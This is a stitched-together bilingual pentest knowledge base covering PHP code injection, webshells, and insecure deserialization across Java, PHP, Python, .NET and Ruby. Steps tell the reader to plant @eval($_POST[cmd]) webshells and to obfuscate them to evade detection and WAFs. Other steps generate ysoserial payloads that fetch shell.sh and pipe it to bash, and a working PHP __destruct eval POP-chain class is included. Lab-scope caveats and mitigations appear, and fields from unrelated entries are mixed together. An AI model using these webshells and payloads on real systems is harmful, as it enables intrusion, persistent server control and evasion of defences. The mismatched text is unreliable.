mitigation.en: Use fixed XPath with a variable resolver and never concatenate paths or predicates; without a variable API, apply a vetted literal encoder and restrict XML access permissions; after the fix, replaying true/false predicates must show no response differences.

description.en: Covers PHP dynamic-execution and command-execution boundary validation: from dangerous-function forms such as eval/assert/preg_replace through system command execution to webshells and function-name-splicing variants, confirming the execution capability of PHP injection points.

prerequisites.zh: 确认 PHP 动态执行边界验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。

description.zh: 列举 system、exec、shell_exec、passthru、popen、proc_open 与反引号的命令执行形态。命中判据：页面输出 whoami 的当前用户名。

explanation.zh: 执行命令返回最后一行
执行命令返回全部输出

description.zh: 部署 @eval/@assert/@system 一句话木马后通过 cmd 参数连接。命中判据：POST cmd=id 后响应包含 uid=… 输出。

description.zh: 用动态属性调用、函数名拼接与 Base64 还原 assert 构造变形一句话。命中判据：传入 cmd 后同样返回命令输出。
description.en: Builds obfuscated one-line webshells with dynamic property calls, concatenated names, and Base64-restored assert. Success check: passing cmd likewise returns command output.

analysis.zh: PHP 动态执行边界验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: PHP Dynamic-Execution Boundary Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.en: Invokes assert indirectly via array_map, call_user_func, and variable functions. Success check: passing cmd returns command output.

explanation.en: Describes how the function segment "assert" participates in this validation command.

description.en: Lets GET parameters func and cmd drive the dynamic call. Success check: func=assert&cmd=id yields uid=... in the response.

explanation.en: Describes how the technique segment "$func($cmd)" participates in this validation command.

title.zh: 执行系统命令摸清权限

description.zh: 把 @eval($_POST[cmd]) 形态的木马写入可访问的 PHP 文件，形成稳定控制点。命中判据：POST cmd=id 后返回命令输出。
description.en: Write an @eval($_POST[cmd]) style one-liner to a reachable PHP file. Success: POST cmd=id returns command output.

title.en: Mutate the webshell to evade detection

description.zh: 用动态调用、函数名拼接与 Base64 还原改造一句话，绕过静态特征检测。命中判据：变形后连接仍返回输出。

description.zh: 危险函数被禁时改用变量函数 $func($cmd) 形式执行命令。命中判据：黑名单之外的形态成功执行命令。
description.en: When dangerous functions are disabled, switch to variable-function $func($cmd). Success: execution succeeds outside the blacklist.

overview.zh: PHP 动态执行边界验证针对把请求参数交给 eval/assert 等动态求值或 system 等命令函数的 PHP 注入场景。覆盖危险函数形态、命令执行、一句话木马与变形一句话四类变体，用于确认 PHP 注入点的代码与命令执行能力。
overview.en: PHP dynamic-execution boundary validation targets PHP injection scenarios where request parameters reach eval/assert dynamic evaluation or system-style command functions. It covers four variants—dangerous function forms, command execution, one-liner webshells, and obfuscated one-liners—to confirm code and command execution capability at the PHP injection point.

vulnerability.zh: 根因是应用把不可信参数传入 eval、assert、preg_replace /e、create_function 等求值结构，或拼入 system、exec、shell_exec、passthru 等命令函数；字符串因此被 PHP 解释为代码或交给系统 Shell 执行。
vulnerability.en: The root cause is untrusted parameters reaching evaluation constructs such as eval, assert, preg_replace /e, or create_function, or being concatenated into command functions like system, exec, shell_exec, and passthru; strings are thereby interpreted as PHP code or handed to the system shell.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步 eval/assert/preg_replace 形态确认动态求值点，传入 system('id'); 出现 uid= 即命中；再用第 2 步命令函数验证执行；确认后第 3 步部署一句话木马并以 cmd=system('id'); 验证；被过滤时用第 4 步拼接与 Base64 变形；WAF 拦截改用回调与变量函数变体。
exploitation.en: Use payloads in list order: confirm dynamic-evaluation points with step 1's eval/assert/preg_replace forms—a uid= response after cmd=id is a hit; verify command execution with step 2's functions; once confirmed, deploy the step-3 one-liner webshell and verify via cmd=id; when filtered, use step 4's concatenation and Base64 variants; on WAF blocks switch to callback and variable-function variants.

mitigation.zh: 移除动态求值与命令拼接，改用固定 API 和参数数组；升级受支持 PHP 并淘汰 assert/create_function 等旧路径，上传目录不可执行。修复后重放第 1、2 步样例，确认求值与命令函数均拒绝可控参数且无异常子进程。
mitigation.en: Remove dynamic evaluation and command concatenation in favor of fixed APIs and argument arrays; upgrade to supported PHP and retire legacy paths like assert/create_function, keeping upload directories non-executable. After the fix, replay step 1 and 2 samples and confirm evaluation and command functions reject controlled input with no anomalous child processes.

name.zh: 多语言不安全反序列化

description.zh: 覆盖多语言不安全反序列化验证：从 ysoserial 生成 Java CommonsCollections 载荷，到 PHP __destruct POP 链、Python __reduce__ 与 .NET 载荷，确认各运行时可利用性。
description.en: Covers exploitation validation of insecure deserialization across runtimes: from ysoserial-generated Java CommonsCollections payloads through PHP __destruct POP chains, Python __reduce__, and .NET payloads, confirming exploitability per runtime.

prerequisites.zh: 确认 不安全反序列化类型边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Unsafe Deserialization Type Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

title.zh: ysoserial 生成命令执行载荷
title.en: Generate a command-execution payload with ysoserial

description.zh: 以 CommonsCollections1 链生成执行 curl 下载并管道给 bash 的序列化载荷，验证 Java 反序列化点可触发命令执行。命中判据：攻击者 HTTP 日志收到目标对 shell.sh 的请求，或目标侧出现对应命令执行痕迹。
description.en: Generate a CommonsCollections1 serialized payload that pipes a downloaded script into bash, verifying the Java deserialization sink reaches command execution. Success check: the attacker HTTP log records the target fetching shell.sh, or the target shows the corresponding command-execution trace.

execution.command:
<?php
class Exploit {
public $cmd = "system('whoami');";
function __destruct() {
eval($this->cmd);
}
}
echo serialize(new Exploit());
?>

description.zh: 定义 __destruct 触发的 Chain→Action 两级调用链并输出其序列化串，验证反序列化点还原对象链后调用 system 执行命令。
description.en: Define a two-level Chain-Action call chain fired from __destruct and print its serialization, verifying the deserialization sink executes system when the chain is restored.

description.zh: 用 __reduce__ 返回 (os.system, ('whoami',)) 并以 pickle.dumps 输出载荷，验证 Python 反序列化点直接映射到命令执行。
description.en: Return (os.system, ('whoami',)) from __reduce__ and emit it with pickle.dumps, verifying the Python deserialization sink maps straight to command execution.

description.zh: 以 ObjectDataProvider gadget 配合 Json.Net 格式生成弹出 calc.exe 的 .NET 反序列化载荷，验证 Json.NET 反序列化点可触发执行。命中判据：目标主机出现计算器进程。
description.en: Generate a .NET deserialization payload that launches calc.exe with the ObjectDataProvider gadget in Json.Net format, verifying the Json.NET sink triggers execution. Success check: a calculator process appears on the target host.

analysis.zh: 不安全反序列化类型边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Unsafe Deserialization Type Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

title.en: Re-sign the payload to pass verification

description.zh: 拿到 HMAC 密钥后对伪造的 payload.ser 重算 SHA-256 HMAC，验证已知密钥时签名校验逻辑会接受伪造的反序列化数据。
description.en: Recompute the SHA-256 HMAC over the forged payload.ser once the key is known, verifying signature checks accept forged data when the key has leaked.

syntaxBreakdown.part:
如果存在签名验证
需要获取密钥重新签名

description.zh: 枚举 Cookie、请求体与接口中的序列化数据字段，判断目标是 Java、PHP 还是 Python 栈。命中判据：畸形序列化串引发解析报错。
description.en: Hunt serialized blobs in cookies/bodies/APIs and fingerprint the stack. Success: malformed blobs trigger parser errors.

title.zh: 投递 Java gadget 载荷

description.zh: 用 ysoserial 生成 CommonsCollections 载荷投向 Java 入口，命令为下载脚本落盘（组合命令用 bash -c {echo,…}|{base64,-d}|{bash,-i} 形式）。命中判据：HTTP 日志收到 /shell.sh 请求或目标侧出现执行痕迹。
description.en: Generate a CommonsCollections payload whose command curls and pipes a script. Success: collector sees the fetch or execution occurs.

description.zh: 定义 __destruct 中 eval 命令的 Exploit 类并输出序列化串投递。命中判据：反序列化后返回 whoami 输出。
description.en: Define a __destruct POP chain and submit its serialized form. Success: whoami output returns after unserialize.

attackChain.payload:
<?php
class Exploit {
public $cmd = "system('whoami');";
function __destruct() {
eval($this->cmd);
}
}
echo serialize(new Exploit());
?>

title.zh: 构造 Python pickle 载荷

description.zh: 用 __reduce__ 返回 os.system 与命令元组并 dumps 输出，投向 Python 入口。命中判据：目标执行命令并回显。
description.en: Build a __reduce__ pickle mapping to os.system and deliver it. Success: the command executes and echoes.

description.zh: 入口校验 HMAC 签名时，用泄露的密钥对载荷重新计算签名后提交。命中判据：重签后的载荷被接受并触发执行。
description.en: When the entry verifies HMAC, recompute the signature with the leaked key. Success: the re-signed payload is accepted and fires.

overview.zh: 不安全反序列化类型边界针对把不可信序列化数据直接还原为运行时对象的场景，覆盖 Java、PHP、Python 与 .NET 四个生态。验证 ysoserial 链、PHP __destruct POP 链、Python __reduce__ 与 .NET ObjectDataProvider 四类利用路径。
overview.en: The unsafe deserialization type boundary targets scenarios where untrusted serialized data is restored directly into runtime objects, spanning Java, PHP, Python, and .NET. It validates four exploitation paths: ysoserial chains, PHP __destruct POP chains, Python __reduce__, and .NET ObjectDataProvider.

vulnerability.zh: 根因是应用对不可信数据调用反序列化且未限制可还原类型，序列化流中的类与魔术方法（readObject/__destruct/__reduce__ 等）在业务校验前被实例化或调用，类路径中的 gadget 可组合为代码执行。
vulnerability.en: The root cause is deserializing untrusted data without type restrictions; classes and magic methods in the stream (readObject/__destruct/__reduce__, etc.) are instantiated or invoked before business validation, and classpath gadgets combine into code execution.

exploitation.zh: Java 目标用第 1 步 ysoserial CommonsCollections1 生成下载载荷投递（Runtime.exec 不解析管道，命令用 curl -o 落盘或 bash -c {echo,…}|{base64,-d}|{bash,-i} 组合形式），以 HTTP 日志收到 shell.sh 请求为命中；PHP 用第 2 步构造 __destruct POP 链，Python 用第 3 步 __reduce__ 返回 os.system，.NET 用第 4 步 ObjectDataProvider 配合 Json.Net。被签名拦截时改用重签名变体。
exploitation.en: For Java, generate the curl|bash payload with step 1's ysoserial CommonsCollections1—a shell.sh request in your HTTP log is a hit; for PHP build step 2's __destruct POP chain, for Python step 3's __reduce__ returning os.system, and for .NET step 4's ObjectDataProvider with Json.Net. If signature checks block the payload, use the re-signed variant.

mitigation.zh: 停止对不可信数据使用原生反序列化，迁移到 JSON 等数据格式；必须兼容时限制允许类型、校验签名并隔离加载进程，移除危险 gadget 依赖。修复后重放第 1-4 步载荷，确认反序列化被拒绝且无异常类加载与子进程。
mitigation.en: Stop native deserialization of untrusted data and migrate to data formats like JSON; where compatibility is required, restrict allowed types, verify signatures, isolate the loading process, and remove dangerous gadget dependencies. After the fix, replay the step 1-4 payloads and confirm rejection with no anomalous class loading or child processes.

overview.en: The image-metadata execution boundary targets images carrying code past upload checks: concatenation, magic headers, and EXIF metadata can turn an image into a PHP carrier. It covers four exploitation paths: image-webshell concatenation, GIF89a and EXIF injection, inclusion/parsing, and Apache MIME mapping.

vulnerability.zh: 根因是上传校验只检查文件头或可预览性而不清洗内容，存储的图片又可被包含入口按 PHP 解释，或被 MIME 映射直接交给 PHP 处理器，图片内的代码因此获得执行机会。
vulnerability.en: The root cause is upload validation that checks only headers or previewability without sanitizing content, combined with stored images being includable as PHP or handed to the PHP handler via MIME mapping—code inside the image thus gets an execution path.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 copy /b 或 cat 把 PHP 代码拼进图片生成 shell.jpg；只查文件头时用第 2 步 GIF89a 或 exiftool 写入 Comment；上传后按第 3 步经包含参数或 phar:// 访问并传 cmd=system('whoami');，返回用户名即执行；扩展名被拦时按第 4 步加 AddType 后直接访问 .jpg。
exploitation.en: Use payloads in list order: append PHP into an image via copy /b or cat in step 1 to produce shell.jpg; when only headers are checked, use step 2's GIF89a or exiftool Comment; after upload, access it through the inclusion parameter or phar:// per step 3 with cmd=whoami—a returned username confirms execution; when extensions are blocked, add AddType per step 4 and request the .jpg directly.

mitigation.zh: 上传图片做完整解码重编码，剥离非常规元数据并按允许列表校验真实类型；上传目录不可执行，包含入口拒绝上传路径，服务器不把图片扩展映射到 PHP。修复后重放第 1-4 步，确认图片马无法落地执行且正常图片可用。
mitigation.en: Fully decode and re-encode uploaded images, strip non-standard metadata, and validate real type against an allowlist; keep upload directories non-executable, reject upload paths at inclusion endpoints, and never map image extensions to PHP. After the fix, replay steps 1-4 and confirm image webshells cannot land or execute while normal images work.

description.zh: Python Pickle包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：反序列化执行后响应或副作用出现对应命令输出（id/whoami/pwd 等）。
description.en: Python Pickle contains multiple reproducible input samples; test them individually and record response and log differences. Success check: after deserialization the response or side effects show the matching command output (id/whoami/pwd, and so on).

analysis.zh: 阳性证据是目标应用的 Pickle 虚拟机从可控流解析 GLOBAL/REDUCE 等操作并调用测试 callable，marker、反序列化调用栈和同一请求或队列 ID 相互对应。 假阳性边界：Base64 解码成功、pickletools 能识别 opcode、流包含命令字符串、反序列化抛错或安全类型允许列表拒绝 callable 都不能证明代码执行。
analysis.en: Positive evidence requires the target application's Pickle virtual machine to parse operations such as GLOBAL or REDUCE from the controlled stream and invoke the test callable, correlating the marker, deserialization stack, and request or queue identifier. False-positive boundary: Successful Base64 decoding, recognizable pickle opcodes, command strings in the stream, deserialization errors, or rejection by a safe-type allowlist does not prove code execution.

opsecTips.zh: 验证优先使用只产生固定 marker 的无害 callable；如需确认真实执行能力，仅使用 id/whoami 等只读命令并保留阴性对照，禁止文件读取与网络外发行；出现子进程、网络外发、非 marker 文件写入、权限变化或 worker 不稳定时立即停止。
opsecTips.en: Python Pickle validation never directly executes the source id, whoami, or file-read lines; stop on child processes, egress, non-marker file writes, privilege changes, or worker instability.

opsecTips.zh: 销毁一次性 worker 和虚拟环境，删除 marker/临时 Pickle、队列消息与缓存对象，清理审计日志中的测试数据并确认无子进程残留。
opsecTips.en: Destroy the disposable worker and virtual environment, delete markers, temporary pickles, queue messages, and cached objects, sanitize test data from audit logs, and confirm no child process remains.

description.en: After moving to a data-only format, replay valid objects, malformed bytes, and the attack sample to confirm business data still loads while execution evidence disappears.

overview.zh: Python Pickle 不安全反序列化针对不可信 Pickle 字节流进入 load/loads 的场景：对象重建阶段可解析任意全局对象并调用可执行函数。验证 GLOBAL 与 REDUCE 指令流是否被真正反序列化执行。
overview.en: Unsafe Python Pickle deserialization targets untrusted pickle byte streams entering load/loads, where object reconstruction can resolve arbitrary globals and invoke executable functions. It validates whether GLOBAL and REDUCE opcode streams are truly deserialized and executed.

vulnerability.zh: 根因是网络请求、缓存、任务队列或上传文件中的数据未经可信校验便进入 Unpickler；Pickle 的 GLOBAL、REDUCE 等操作码可解析模块成员并在反序列化期间调用函数，格式本身不提供来源认证。
vulnerability.en: The root cause is data from network requests, caches, task queues, or uploads entering the Unpickler without trusted validation; pickle opcodes like GLOBAL and REDUCE resolve module members and invoke functions during deserialization, and the format provides no origin authentication.

exploitation.zh: 按第 1 步逐条提交 cos system 的 REDUCE 指令流（payload 形式为 os.system 包裹 whoami/id 等命令），记录响应与日志差异；命中判据为反序列化执行后响应或副作用出现对应命令输出。确认执行能力后可读取标记文件形成证据；Base64 传输的入口先解码再提交。注意区分普通解码错误、对象重建异常与真正函数调用三种现象。
exploitation.en: Submit the cos-system REDUCE opcode streams one by one per step 1 (payloads wrapping whoami/id-style commands in os.system), recording response and log differences; a hit is the corresponding command output appearing in responses or side effects after deserialization. Once execution is confirmed, read a marker file for evidence; decode Base64-transported entries before submitting. Distinguish ordinary decode errors, object-reconstruction exceptions, and genuine function invocation.

mitigation.zh: 跨信任边界改用 JSON 等只表达数据的格式；拒绝对外部输入调用 pickle.load 或 pickle.loads，并对历史队列执行来源认证和迁移；以最低权限隔离仍需读取的遗留数据。修复后重放第 1 步指令流，确认被拒绝且业务数据读取正常。
mitigation.en: Switch to data-only formats like JSON across trust boundaries; refuse pickle.load/pickle.loads on external input, and authenticate origins and migrate historical queues; isolate legacy data that must still be read with least privilege. After the fix, replay the step-1 opcode streams and confirm rejection while business data reads work normally.

description.en: Ruby Marshal contains multiple reproducible input samples; test them individually and record response and log differences. Success check: Marshal.load executes and returns the matching command output (id/whoami, and so on).

analysis.zh: 阳性证据是不可信 Marshal 对象在目标 load 调用中实例化可控类并触发测试加载回调或已确认 Gadget 的 marker 副作用，调用栈与输入哈希完整关联。 假阳性边界：Marshal.load 成功返回普通字符串、样例中出现 id/whoami 文本、Base64 可解码、类不存在异常或仅离线解析类型都不是 RCE。
analysis.en: Positive evidence requires an untrusted Marshal object to instantiate a controllable class in the target load call and trigger a test load callback or a confirmed gadget's marker effect, correlating call stack and input hash. False-positive boundary: Marshal.load returning a plain string, id or whoami text inside a sample, successful Base64 decoding, a missing-class exception, or offline type parsing is not RCE.

opsecTips.zh: Ruby Marshal 测试只允许 marker 回调，不执行源命令或真实 Gadget；出现进程启动、文件/网络副作用、Rails worker 重启或全局对象污染时停止。
opsecTips.en: Ruby Marshal testing permits marker callbacks only and never executes source commands or real gadgets; stop on process creation, file or network effects, Rails worker restarts, or global-object pollution.

opsecTips.zh: 终止隔离 Ruby 进程，删除临时对象流和 marker，清理 job/session/cache 中的序列化副本，并重启测试 worker 释放加载类状态。
opsecTips.en: Terminate the isolated Ruby process, delete temporary object streams and markers, clear serialized copies from jobs, sessions, and caches, and restart test workers to release loaded-class state.
